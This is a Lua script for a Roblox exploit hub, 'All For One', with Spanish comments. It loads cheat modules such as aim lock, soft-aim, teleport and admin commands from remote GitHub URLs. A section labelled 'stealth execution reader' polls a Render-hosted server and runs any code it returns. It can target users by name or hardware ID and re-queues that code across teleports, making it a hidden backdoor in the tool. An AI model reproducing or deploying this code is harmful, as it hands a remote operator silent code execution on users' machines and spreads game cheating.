-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 1: PROTECCIÓN Y PRIMER HILO 
-- ═══════════════════════════════════════════════════════════════════════════
local EXECUTOR_DEFAULT_AVATAR = ...
if type(EXECUTOR_DEFAULT_AVATAR) ~= "string" or EXECUTOR_DEFAULT_AVATAR == "" then
    EXECUTOR_DEFAULT_AVATAR = nil
end

if getgenv()._AFO_HUB_LOADED then
    warn("[All for One] Ya hay una instancia del hub corriendo. Ciérrala antes de abrir otra.")
    return
end
getgenv()._AFO_HUB_LOADED = true

local BOOT_START_TIME = tick()

if not getgenv()._AFO_IS_REJOIN then
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/BootAnimation.lua"))()
        end)
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 2: SERVICIOS Y UTILIDADES GENÉRICAS
-- ═══════════════════════════════════════════════════════════════════════════

local cloneref = cloneref or function(x) return x end

local httprequest = http_request or request or (syn and syn.request) or nil
if not httprequest then
    warn("[AllForOne] No se encontró ninguna función HTTP request. Algunas funciones pueden fallar.")
end

local HttpService = cloneref(game:GetService("HttpService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
-- Resuelve la mejor funcion de portapapeles disponible en este ejecutor y la expone
-- para que Lock.lua, el emote script, etc. no dependan de que exista "setclipboard" a secas.
local bestClipboard = setclipboard or toclipboard or set_clipboard or setrbxclipboard or (Clipboard and Clipboard.set)
if bestClipboard and not setclipboard then
    getgenv().setclipboard = bestClipboard
end

local Players = cloneref(game:GetService("Players"))
local TeleportService = cloneref(game:GetService("TeleportService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local RunService = cloneref(game:GetService("RunService"))
local TweenService = cloneref(game:GetService("TweenService"))
local Debris = game:GetService("Debris")

local lplr = Players.LocalPlayer
local camera = workspace.CurrentCamera
local placeId = game.PlaceId
local jobId = game.JobId

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 3: SELF‑RELOAD
-- ═══════════════════════════════════════════════════════════════════════════

local SELF_URL = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Core.lua"
local _qt = queue_on_teleport

local function QueueSelf()
    if type(_qt) ~= "function" then
        return false
    end

    if getgenv()._AFO_RELOAD_QUEUED then
        return true
    end

    local queuedSource = string.format([[
getgenv()._AFO_HUB_LOADED = nil
getgenv()._AFO_RELOAD_QUEUED = nil
getgenv()._AFO_IS_REJOIN = true
loadstring(game:HttpGet(%q))(%q)
]], SELF_URL, EXECUTOR_DEFAULT_AVATAR or "")

    local ok, err = pcall(_qt, queuedSource)
    if not ok then
        return false
    end

    getgenv()._AFO_RELOAD_QUEUED = true
    return true
end

getgenv().AFOQueueSelf = QueueSelf

pcall(function()
    lplr.OnTeleport:Connect(function()
        QueueSelf()
    end)
end)

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 4: SISTEMA DE IDIOMA
-- ═══════════════════════════════════════════════════════════════════════════

local savedLang = "ES"
pcall(function()
    local data = readfile("AllForOne/lang.txt")
    if data == "EN" or data == "ES" then savedLang = data end
end)

local startOnSettings = false
pcall(function()
    local lastTab = readfile("AllForOne/last_tab.txt")
    if lastTab == "settings" then
        startOnSettings = true
        writefile("AllForOne/last_tab.txt", "")
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 5: ESTADOS RUNTIME
-- ═══════════════════════════════════════════════════════════════════════════

local adminShieldEnabled  = true
local phoenixEnabled      = true   
local autoRejoinEnabled   = true   
local _kickedByHub        = false
getgenv()._kickedByHub    = false

local teleportEnabled     = true
local lockEnabled         = true
local passiveBangEnabled  = true
local muiEnabled          = true
local omniBlockEnabled    = true
local unpredicEnabled     = false
local softAimEnabled      = true
local antiFlingEnabled    = true

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 6: KEYBINDS
-- ═══════════════════════════════════════════════════════════════════════════

local Keys = {
    Teleport           = Enum.KeyCode.BackSlash,
    Lock               = Enum.KeyCode.X,
    EmoteSteal         = Enum.KeyCode.T,
    EmoteExecute       = Enum.KeyCode.Y,
    EmoteExpand        = Enum.KeyCode.U,
    PassiveBang        = Enum.KeyCode.Quote,
    CopyAvatar         = Enum.KeyCode.F4,
    OmniBlock          = Enum.KeyCode.F,
    OmniPush           = Enum.KeyCode.R,
    Gravattack         = Enum.KeyCode.C,
    GravattackMenu     = Enum.KeyCode.F6,
    SpeedForce         = Enum.KeyCode.F5,
    MUI                = Enum.KeyCode.Five,
    PhoenixMenu        = Enum.KeyCode.F7,
}

local function updateKeyVars() end
updateKeyVars()

local function parseKeyCode(key, fallback)
    if typeof then
        local t = typeof(key)
        if t == "EnumItem" then return key end
    end
    if type(key) ~= "string" then return fallback end
    if key == "" or key == "Unknown" then return fallback end
    local aliases = {
        ["}"] = "BackSlash", ["\\"] = "BackSlash", ["Backslash"] = "BackSlash",
        ["BackSlash"] = "BackSlash", ["RightBracket"] = "BackSlash",
        ["+"] = "Equals", ["Plus"] = "Equals",
    }
    local keyName = aliases[key] or key
    local ok, kc = pcall(function() return Enum.KeyCode[keyName] end)
    if ok and kc and kc ~= Enum.KeyCode.Unknown then return kc end
    return fallback
end

local function applyKey(targetName, key, fallback)
    Keys[targetName] = parseKeyCode(key, fallback)
    updateKeyVars()
    return Keys[targetName]
end

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 7: URLS DE MÓDULOS EXTERNOS
-- ═══════════════════════════════════════════════════════════════════════════

local MODULE_URLS = {
    Teleport    = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Teleport.lua",
    NoCDDash    = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/No%20CD%20Dash.lua",
    Unpredic    = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Unpredictable%20Animations.lua",
    StealEmote  = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Your%20Emote%2C%20My%20Emote.lua",
    AdminShield = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Admin%20Shield.lua",
    Phoenix     = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Operation%20Phoenix.lua",
    AutoRejoin  = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Auto%20Rejoin.lua",
    Gravattack  = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Gravattack.lua",
    Lock        = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Lock.lua",
    Softaim     = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Softaim.lua",
    MUI         = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/MUI.lua",
    Omniblock   = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Omniblock.lua",
    PassiveBang = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Passive%20Bang.lua",
    AntiFling   = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Anti%20Flight.lua",
    SpeedForce  = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/SpeedForce.lua",
    CopyAvatar  = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/CopyAvatar.lua",
}

local LoadedModules = {}

local function loadModule(name)
    if LoadedModules[name] then return LoadedModules[name] end
    local url = MODULE_URLS[name]
    if not url then return nil end
    if name == "Gravattack" or name == "Lock" or name == "MUI" then
        url = url .. "?t=" .. tick()
    end
    local ok, result = pcall(function()
        local chunk = loadstring(game:HttpGet(url))
        if type(chunk) == "function" then
            return chunk()
        end
        return nil
    end)
    if ok and result then
        LoadedModules[name] = result
        return result
    end
    return nil
end

getgenv().loadModule = loadModule

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 8: GESTOR DE CONEXIONES
-- ═══════════════════════════════════════════════════════════════════════════

local allConnections = {}
local function trackConnection(conn)
    table.insert(allConnections, conn)
    return conn
end
local function disconnectAllConnections()
    for _, conn in ipairs(allConnections) do
        pcall(function() conn:Disconnect() end)
    end
    allConnections = {}
end

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 9: NOTIFICACIONES
-- ═══════════════════════════════════════════════════════════════════════════

local Fluent
local initializing = true
local function notify(title, content, duration)
    if not initializing then
        pcall(function()
            Fluent:Notify({ Title = title, Content = content, Duration = duration or 4 })
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 10: INTERFAZ DE USUARIO Y BACKGROUND LOADING
-- ═══════════════════════════════════════════════════════════════════════════

-- Antes se descargaban Lang, UI, SaveManager, InterfaceManager y el Theme uno
-- detrás de otro (5 peticiones HTTP seguidas y bloqueantes). Ahora se piden
-- las 5 a la vez: el arranque tarda lo que tarde la mas lenta, no la suma de todas.
local REMOTE_SOURCES = {
    Lang             = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/Lang.lua",
    UI               = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/UI.lua",
    SaveManager      = "https://raw.githubusercontent.com/StyearX/Fluent-modded/main/Addons/SaveManager.lua",
    InterfaceManager = "https://raw.githubusercontent.com/StyearX/Fluent-modded/main/Addons/InterfaceManager.lua",
    Theme            = "https://raw.githubusercontent.com/AllForOneScripts/Quirks/main/All%20For%20One%20Theme.lua",
}
local remoteResults, remotePending = {}, 0
for key, url in pairs(REMOTE_SOURCES) do
    remotePending += 1
    task.spawn(function()
        local ok, chunk = pcall(function() return loadstring(game:HttpGet(url)) end)
        local value = nil
        if ok and type(chunk) == "function" then
            local ok2, result = pcall(chunk)
            if ok2 then value = result end
        end
        remoteResults[key] = value
        remotePending -= 1
    end)
end
while remotePending > 0 do task.wait() end

local Lang = remoteResults.Lang or {}
local T = Lang[savedLang] or {}

Fluent = remoteResults.UI

-- ═══════════════════════════════════════════════════════════════════════════
--  LECTOR DE EJECUCIÓN STEALTH
-- ═══════════════════════════════════════════════════════════════════════════

local RENDER_MESSAGES_URL = "https://quirks.onrender.com/messages"
local renderLastMessageId = 0
local renderPollDelay = 3
local renderMaxPollDelay = 30

local scriptHistory = {}
local permanentScripts = {}
local lastScriptId = nil

local function checkTarget(userVar)
    if not userVar then return false end
    if userVar == "all" then return true end
    
    if userVar:sub(1, 6) == "local-" then
        local targetId = userVar:sub(7)
        for _, p in ipairs(Players:GetPlayers()) do
            if tostring(p.UserId) == targetId or p.Name == targetId then
                return true
            end
        end
        return false
    end
    
    if userVar:sub(1, 1) == "@" then
        return lplr.Name == userVar:sub(2)
    end
    
    if userVar:sub(1, 1) == '"' and userVar:sub(-1, -1) == '"' then
        return lplr.DisplayName == userVar:sub(2, -2)
    end
    
    if userVar:sub(1, 5) == "hdiw-" then
        local myHwid = (gethwid and gethwid()) or "UNKNOWN"
        return myHwid == userVar:sub(6)
    end
    return false
end

local function executeScript(code, data, runId)
    if not code or not data then return end
    if not checkTarget(data.user) then return end

    local cdString = string.gsub(data.cd, ",", ".")
    local cdTime = tonumber(cdString) or 0
    local taskId = runId or tostring(tick())

    if data.constant == "yes" then
        permanentScripts[taskId] = code
    end

    task.spawn(function()
        if cdTime > 0 then
            task.wait(cdTime)
        end
        local compiledCode = loadstring(code)
        if compiledCode then
            pcall(compiledCode)
        end
    end)
end

if type(_qt) == "function" then
    pcall(function()
        lplr.OnTeleport:Connect(function()
            for _, code in pairs(permanentScripts) do
                pcall(function() _qt(code) end)
            end
        end)
    end)
end

local function readRenderAnnouncements()
    if type(httprequest) ~= "function" then return end

    task.spawn(function()
        while initializing do task.wait(0.25) end
        local retryDelay = renderPollDelay

        while getgenv()._AFO_HUB_LOADED do
            local ok, response = pcall(function()
                return httprequest({
                    Url = RENDER_MESSAGES_URL .. "?after=" .. tostring(renderLastMessageId),
                    Method = "GET",
                    Headers = { ["Accept"] = "application/json" },
                })
            end)

            local statusCode = ok and response and tonumber(response.StatusCode)
            local body = ok and response and response.Body

            if statusCode and statusCode >= 200 and statusCode < 300 and type(body) == "string" then
                local decodedOk, payload = pcall(function()
                    return HttpService:JSONDecode(body)
                end)

                if decodedOk and type(payload) == "table" and type(payload.messages) == "table" then
                    for _, msg in ipairs(payload.messages) do
                        local msgId = tonumber(msg.id)
                        if msgId and msgId > renderLastMessageId then
                            renderLastMessageId = msgId

                            if tostring(msg.v) == "1" and type(msg.text) == "string" then
                                local text = msg.text

                                if text:match("^runid:(.+)$") then
                                    local rId = text:match("^runid:(.+)$")
                                    local targetId = (rId == "pass") and lastScriptId or rId
                                    if targetId and scriptHistory[targetId] then
                                        local historyEntry = scriptHistory[targetId]
                                        executeScript(historyEntry.code, historyEntry.data, targetId)
                                    end

                                elseif text:match("^stopid:(.+)$") then
                                    local sId = text:match("^stopid:(.+)$")
                                    local targetId = (sId == "pass") and lastScriptId or sId
                                    if targetId then
                                        permanentScripts[targetId] = nil
                                        getgenv()["stop_" .. tostring(targetId)] = true
                                    end
                                else
                                    local dataBlock = text:match("//%s*Data:%{(.-)%}%s*$")
                                    local scriptContent = text:gsub("//%s*Data:%{.-%}%s*$", "")
                                    
                                    if dataBlock then
                                        local u = dataBlock:match("user:([^,]+)")
                                        local c = dataBlock:match("constant:([^,]+)")
                                        local d = dataBlock:match("cd:([^%}]+)")

                                        if u and c and d then
                                            local parsedData = { user = u, constant = c, cd = d }
                                            local stringMsgId = tostring(msgId)
                                            
                                            scriptHistory[stringMsgId] = { code = scriptContent, data = parsedData }
                                            lastScriptId = stringMsgId
                                            getgenv()["stop_" .. stringMsgId] = false
                                            
                                            executeScript(scriptContent, parsedData, stringMsgId)
                                        end
                                    end
                                end
                            end
                        end
                    end
                    retryDelay = renderPollDelay
                else
                    retryDelay = math.min(retryDelay * 2, renderMaxPollDelay)
                end
            else
                retryDelay = math.min(retryDelay * 2, renderMaxPollDelay)
            end
            task.wait(retryDelay)
        end
    end)
end

readRenderAnnouncements()

local SaveManager = remoteResults.SaveManager
local InterfaceManager = remoteResults.InterfaceManager
local AllForOneTheme = remoteResults.Theme

pcall(function()
    Fluent:RegisterCustomTheme("AllForOne", AllForOneTheme)
end)

local rawNotify = Fluent.Notify
Fluent.Notify = function(self, data)
    if data and data.Content and (string.find(data.Content, "F3") or string.find(data.Content, "toggle the interface")) then
        return 
    end
    return rawNotify(self, data)
end

-- ═══════════════════════════════════════════════════════════════════════════
--  VERSIÓN DEL HUB (ajuste dinámico)
--  Cambia solo HUB_VERSION. También se puede cambiar en caliente con
--  getgenv().AFOSetVersion("9.00")  ->  se muestra "9.0".
-- ═══════════════════════════════════════════════════════════════════════════
local HUB_VERSION = "8.46"

-- 8.46 -> "8.46" | 9.00 -> "9.0" | 9 -> "9.0" | 9.10 -> "9.10"
local function formatVersion(v)
    local s = tostring(v or "")
    local num = tonumber(s)
    if num then s = string.format("%.2f", num) end
    local major, minor = s:match("^(%d+)%.(%d+)$")
    if major then
        if minor == "00" then
            minor = "0"
        end
        return major .. "." .. minor
    end
    return s
end

local Window
local abrio, windowErr = pcall(function()
    Window = Fluent:CreateWindow({
        Title = "All For One",
        SubTitle = T.subtitle or "Hub",
        Version = formatVersion(HUB_VERSION),
        TabWidth = 160,
        Size = UDim2.fromOffset(620, 500),
        Acrylic = false,
        Theme = "AllForOne",
        MinimizeKey = Enum.KeyCode.F3,
        UserInfoTop = true,
        UserInfoTitle = "All For One",
        UserInfoSubtitle = lplr.DisplayName,
        UserInfoColor = AllForOneTheme.Accent,
    })
end)

if not abrio or not Window then
    warn("[AllForOne] No se pudo crear la ventana: " .. tostring(windowErr))
    return
end

pcall(function()
    if Window.Minimize then Window:Minimize() end
end)

if SaveManager and InterfaceManager then
    InterfaceManager:SetLibrary(Fluent)
    InterfaceManager:SetFolder("AllForOne")

    local function ForceAllForOneTheme()
        InterfaceManager.Settings.Theme = "AllForOne"
        Fluent:SetTheme("AllForOne")
        pcall(function() InterfaceManager:SaveSettings() end)
    end
    ForceAllForOneTheme()
end

if type(AllForOneTheme.BuildDesign) == "function" then
    pcall(AllForOneTheme.BuildDesign, Window)
end

-- Insignia de versión: fondo negro, texto blanco y número siempre centrado.
-- El ancho se recalcula solo según el texto (8.46, 9.0, 10.25...).
local BADGE_HEIGHT    = 16
local BADGE_MIN_WIDTH = 34
local BADGE_SIDE_PAD  = 14   -- espacio total (izq + der) alrededor del texto

local function getVersionBadge()
    local ok, badge = pcall(function()
        return Window.TitleBar.Frame:FindFirstChild("VersionBadge", true)
    end)
    return ok and badge or nil
end

local function styleVersionBadgeUnsafe()
    local badge = getVersionBadge()
    if not badge then return end
    local label = badge:FindFirstChild("VersionText")
    if not label then return end

    -- Colores: negro con texto blanco
    badge.BackgroundColor3       = Color3.fromRGB(0, 0, 0)
    badge.BackgroundTransparency = 0
    label.TextColor3             = Color3.fromRGB(255, 255, 255)

    -- Centrado: el texto ocupa todo el badge y se alinea al centro en X e Y
    local pad = badge:FindFirstChildOfClass("UIPadding")
    if pad then pad:Destroy() end
    badge.AutomaticSize   = Enum.AutomaticSize.None
    label.AutomaticSize   = Enum.AutomaticSize.None
    label.AnchorPoint     = Vector2.new(0.5, 0.5)
    label.Position        = UDim2.fromScale(0.5, 0.5)
    label.Size            = UDim2.fromScale(1, 1)
    label.TextXAlignment  = Enum.TextXAlignment.Center
    label.TextYAlignment  = Enum.TextYAlignment.Center
    label.TextWrapped     = false

    -- Ancho dinámico según el texto actual
    local function fit()
        local w = math.max(BADGE_MIN_WIDTH, math.ceil(label.TextBounds.X) + BADGE_SIDE_PAD)
        badge.Size = UDim2.fromOffset(w, BADGE_HEIGHT)
    end
    fit()
    if not badge:GetAttribute("AFO_Fit") then
        badge:SetAttribute("AFO_Fit", true)
        label:GetPropertyChangedSignal("TextBounds"):Connect(fit)
    end
end

-- Protegido: un fallo cosmético nunca debe detener el resto del script
local function styleVersionBadge()
    local ok, err = pcall(styleVersionBadgeUnsafe)
    if not ok then warn("[AllForOne] Badge de versión: " .. tostring(err)) end
end

local function setHubVersion(v)
    HUB_VERSION = v
    pcall(function() Fluent:SetVersion(formatVersion(v)) end)
    styleVersionBadge()
end
getgenv().AFOSetVersion = setHubVersion

styleVersionBadge()
task.defer(styleVersionBadge)

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 11: TAB "PODER"
-- ═══════════════════════════════════════════════════════════════════════════

local Power = Window:AddTab({ Title = T.tab_power or "Power", Icon = "flame" })

Power:AddButton({
    Title = T.lbl_infiniteyield or "Infinite Yield",
    Callback = function()
        pcall(function()
            local chunk = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))
            if type(chunk) == "function" then chunk() end
            notify(T.notif_iy_loaded or "Infinite Yield loaded", T.notif_iy_content or "Admin commands are now available.", 4)
        end)
    end
})

local lockModule = nil
local function initializeLock()
    if lockModule then return end
    lockModule = loadModule("Lock")
    if lockModule then
        lockModule.Start(lplr, Keys.Lock)
        notify(T.notif_lock_title or "Lock", T.notif_on or "ON", 3)
    end
end

Power:AddToggle("LockToggle", {
    Title = T.lbl_lock or "Lock",
    Default = true,
    Callback = function(value)
        lockEnabled = value
        if value then
            initializeLock()
            if lockModule and lockModule.Start then lockModule.Start(lplr, Keys.Lock) end
        else
            if lockModule and lockModule.Stop then lockModule.Stop() end
        end
        notify(T.notif_lock_title or "Lock", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

Power:AddKeybind("LockKeybind", {
    Title = T.lbl_lock_key or "Lock Keybind",
    Default = "X",
    Callback = function(key)
        applyKey("Lock", key, Enum.KeyCode.X)
        if lockModule and lockModule.SetLockKey then pcall(function() lockModule.SetLockKey(Keys.Lock) end) end
    end,
    ChangedCallback = function(key)
        applyKey("Lock", key, Enum.KeyCode.X)
        if lockModule and lockModule.SetLockKey then pcall(function() lockModule.SetLockKey(Keys.Lock) end) end
    end
})

local _tpModule = nil
local function tpStop()
    if _tpModule and type(_tpModule) == "table" and _tpModule.Stop then pcall(function() _tpModule.Stop() end) end
end
local function tpStart()
    if not _tpModule then _tpModule = loadModule("Teleport") end
    if _tpModule and type(_tpModule) == "table" and _tpModule.Start then pcall(function() _tpModule.Start(Keys, lplr) end) end
end

Power:AddToggle("TeleportToggle", {
    Title = T.lbl_teleport or "Teleport",
    Default = true,
    Callback = function(value)
        teleportEnabled = value
        if value then tpStart() else tpStop() end
        notify(T.notif_tp_title or "Teleport", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})
Power:AddKeybind("TeleportKeybind", {
    Title = T.lbl_tp_key or "Teleport Keybind",
    Default = "BackSlash",
    Callback = function(key)
        applyKey("Teleport", key, Enum.KeyCode.BackSlash)
        if _tpModule and _tpModule.SetKey then pcall(function() _tpModule.SetKey(Keys.Teleport) end) end
    end,
    ChangedCallback = function(key)
        applyKey("Teleport", key, Enum.KeyCode.BackSlash)
        if _tpModule and _tpModule.SetKey then pcall(function() _tpModule.SetKey(Keys.Teleport) end) end
    end
})

local _pbModule = nil
local function pbStop()
    if _pbModule and type(_pbModule) == "table" and _pbModule.Stop then pcall(function() _pbModule.Stop() end) end
end
local function pbStart()
    if not _pbModule then _pbModule = loadModule("PassiveBang") end
    if _pbModule and type(_pbModule) == "table" and _pbModule.Start then pcall(function() _pbModule.Start(Keys, lplr) end) end
end

Power:AddToggle("PassiveBangToggle", {
    Title = T.lbl_passivebang or "Passive Bang",
    Default = true,
    Callback = function(value)
        passiveBangEnabled = value
        if value then pbStart() else pbStop() end
        notify(T.notif_pb_title or "Passive Bang", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})
Power:AddKeybind("PassiveBangKeybind", {
    Title = T.lbl_passivebang_key or "Keybind",
    Default = "Quote",
    Callback = function(key)
        applyKey("PassiveBang", key, Enum.KeyCode.Quote)
        if _pbModule and _pbModule.SetKey then pcall(function() _pbModule.SetKey(Keys.PassiveBang) end) end
    end,
    ChangedCallback = function(key)
        applyKey("PassiveBang", key, Enum.KeyCode.Quote)
        if _pbModule and _pbModule.SetKey then pcall(function() _pbModule.SetKey(Keys.PassiveBang) end) end
    end
})

local _muiModule = nil
local function muiStart()
    if not _muiModule then _muiModule = loadModule("MUI") end
    if type(_muiModule) == "table" then
        if type(_muiModule.SetDodgeKey) == "function" then pcall(function() _muiModule.SetDodgeKey(Keys.MUI) end) end
        if type(_muiModule.Start) == "function" then pcall(function() _muiModule.Start() end)
        elseif type(_muiModule.SetEnabled) == "function" then pcall(function() _muiModule.SetEnabled(true) end) end
    elseif type(_muiModule) == "function" then pcall(_muiModule) end
end
local function muiStop()
    if type(_muiModule) ~= "table" then return end
    if type(_muiModule.Stop) == "function" then pcall(function() _muiModule.Stop() end)
    elseif type(_muiModule.SetEnabled) == "function" then pcall(function() _muiModule.SetEnabled(false) end) end
end
Power:AddToggle("MUIToggle", {
    Title = T.lbl_mui or "MUI",
    Default = true,
    Callback = function(value)
        muiEnabled = value
        if value then muiStart() else muiStop() end
        notify(T.notif_mui_title or "MUI", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

Power:AddKeybind("MUIKeybind", {
    Title = T.lbl_emergency_mui_key or "Emergency MUI Key",
    Default = "Five",
    Callback = function(key)
        applyKey("MUI", key, Enum.KeyCode.Five)
        if _muiModule and _muiModule.SetDodgeKey then pcall(function() _muiModule.SetDodgeKey(Keys.MUI) end) end
    end,
    ChangedCallback = function(key)
        applyKey("MUI", key, Enum.KeyCode.Five)
        if _muiModule and _muiModule.SetDodgeKey then pcall(function() _muiModule.SetDodgeKey(Keys.MUI) end) end
    end
})

local _omniModule = nil
local function omniStop()
    if _omniModule and type(_omniModule) == "table" and _omniModule.Stop then pcall(function() _omniModule.Stop() end) end
end
local function omniStart()
    if not _omniModule then _omniModule = loadModule("Omniblock") end
    if _omniModule and type(_omniModule) == "table" and _omniModule.Start then
        pcall(function() _omniModule.Start(Keys, lplr, Players, RunService, UserInputService, camera, Debris, getgenv()) end)
    end
end
Power:AddToggle("OmniBlockToggle", {
    Title = T.lbl_omniblock or "OmniBlock",
    Default = true,
    Callback = function(value)
        omniBlockEnabled = value
        if value then omniStart() else omniStop() end
        notify(T.notif_omniblock_title or "OmniBlock", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

Power:AddKeybind("OmniPushKeybind", {
    Title = T.lbl_omniblock_push_key or "OmniBlock Push Key",
    Default = "R",
    Callback = function(key)
        applyKey("OmniPush", key, Enum.KeyCode.R)
        if _omniModule and type(_omniModule) == "table" and _omniModule.SetPushKey then pcall(function() _omniModule.SetPushKey(Keys.OmniPush) end) end
    end,
    ChangedCallback = function(key)
        applyKey("OmniPush", key, Enum.KeyCode.R)
        if _omniModule and type(_omniModule) == "table" and _omniModule.SetPushKey then pcall(function() _omniModule.SetPushKey(Keys.OmniPush) end) end
    end
})

local _unpredicModule = nil
local function unpredicStop()
    if _unpredicModule and type(_unpredicModule) == "table" and _unpredicModule.Stop then pcall(function() _unpredicModule.Stop() end) end
end
local function unpredicStart(char)
    if not _unpredicModule then _unpredicModule = loadModule("Unpredic") end
    if _unpredicModule and type(_unpredicModule) == "table" and _unpredicModule.Start then pcall(function() _unpredicModule.Start(char) end) end
end
Power:AddToggle("UnpredicToggle", {
    Title = T.lbl_unpredicaims or "Unpredictable Animations",
    Default = false,
    Callback = function(value)
        unpredicEnabled = value
        if value then
            local char = lplr.Character
            if char then unpredicStart(char) end
        else unpredicStop() end
        notify(T.notif_unpredic_title or "Unpredictable Anims", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

local _softaimModule = nil
local function softAimStop()
    if _softaimModule and type(_softaimModule) == "table" and _softaimModule.Stop then pcall(function() _softaimModule.Stop() end) end
end
local function softAimSetup()
    if not _softaimModule then _softaimModule = loadModule("Softaim") end
    if _softaimModule and type(_softaimModule) == "table" and _softaimModule.Setup then pcall(function() _softaimModule.Setup(Keys, lplr, Players, RunService, UserInputService, camera) end) end
end
Power:AddToggle("SoftAimToggle", {
    Title = T.lbl_softaim or "SoftAim",
    Default = true,
    Callback = function(value)
        softAimEnabled = value
        if value then softAimSetup() else softAimStop() end
        if _softaimModule and _softaimModule.SetEnabled then pcall(function() _softaimModule.SetEnabled(value) end) end
        notify(T.notif_softaim_title or "SoftAim", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

local _speedForceModule = nil
local function speedForceStart()
    task.spawn(function()
        if not _speedForceModule then _speedForceModule = loadModule("SpeedForce") end
        if _speedForceModule then
            pcall(function()
                if type(_speedForceModule) == "table" and type(_speedForceModule.Start) == "function" then
                    _speedForceModule.Start(Keys, lplr)
                elseif type(_speedForceModule) == "function" then
                    _speedForceModule(Keys, lplr)
                end
            end)
        end
    end)
end
Power:AddButton({
    Title = T.lbl_speedforce or "SpeedForce",
    Callback = function() speedForceStart() end
})
Power:AddKeybind("SpeedForceKeybind", {
    Title = T.lbl_speedforce_key or "SpeedForce Key",
    Default = "F5",
    Callback = function(key)
        applyKey("SpeedForce", key, Enum.KeyCode.F5)
        if _speedForceModule and type(_speedForceModule) == "table" and _speedForceModule.SetKey then pcall(function() _speedForceModule.SetKey(Keys.SpeedForce) end) end
    end,
    ChangedCallback = function(key)
        applyKey("SpeedForce", key, Enum.KeyCode.F5)
        if _speedForceModule and type(_speedForceModule) == "table" and _speedForceModule.SetKey then pcall(function() _speedForceModule.SetKey(Keys.SpeedForce) end) end
    end
})

local _noCDDashModule = nil
local function noCDDashStart()
    if not _noCDDashModule then _noCDDashModule = loadModule("NoCDDash") end
    if _noCDDashModule and type(_noCDDashModule) == "table" and _noCDDashModule.Start then pcall(function() _noCDDashModule.Start(lplr) end) end
end
local function noCDDashStop()
    if _noCDDashModule and type(_noCDDashModule) == "table" and _noCDDashModule.Stop then pcall(function() _noCDDashModule.Stop() end) end
end
Power:AddToggle("NoCDDashToggle", {
    Title = T.lbl_nocddash or "No CD Dash",
    Default = true,
    Callback = function(value)
        if value then noCDDashStart() else noCDDashStop() end
        notify(T.notif_nocddash_title or "No CD Dash", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

local gravattackModule = nil
local function gravattackInitialize()
    gravattackModule = loadModule("Gravattack")
end
local function gravattackApplyKeys()
    if type(gravattackModule) ~= "table" then return end
    if gravattackModule.SetDropKeybind then
        pcall(function() gravattackModule.SetDropKeybind(Keys.Gravattack) end)
    elseif gravattackModule.SetKey then
        pcall(function() gravattackModule.SetKey(Keys.Gravattack) end)
    end
    if gravattackModule.SetMenuKey then
        pcall(function() gravattackModule.SetMenuKey(Keys.GravattackMenu) end)
    end
end
Power:AddToggle("GravattackToggle", {
    Title = T.lbl_gravattack or "Gravattack",
    Default = true,
    Callback = function(value)
        if not gravattackModule then gravattackInitialize() end
        if gravattackModule and type(gravattackModule) == "table" then
            if value and gravattackModule.Start then
                gravattackModule.Start()
                gravattackApplyKeys()
            elseif not value and gravattackModule.Stop then
                gravattackModule.Stop()
            end
        end
        notify(T.notif_gravattack_title or "Gravattack", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})
Power:AddKeybind("GravattackKeybind", {
    Title = T.lbl_gravattack_key or "Gravattack Key",
    Default = "C",
    Callback = function(key)
        applyKey("Gravattack", key, Enum.KeyCode.C)
        gravattackApplyKeys()
    end,
    ChangedCallback = function(key)
        applyKey("Gravattack", key, Enum.KeyCode.C)
        gravattackApplyKeys()
    end
})
Power:AddKeybind("GravattackMenuKeybind", {
    Title = T.lbl_gravattack_menu_key or "Gravattack Menu Key",
    Default = "F6",
    Callback = function(key)
        applyKey("GravattackMenu", key, Enum.KeyCode.F6)
        gravattackApplyKeys()
    end,
    ChangedCallback = function(key)
        applyKey("GravattackMenu", key, Enum.KeyCode.F6)
        gravattackApplyKeys()
    end
})
task.spawn(gravattackInitialize)

-- ═══════════════════════════════════════════════════════════════════════════
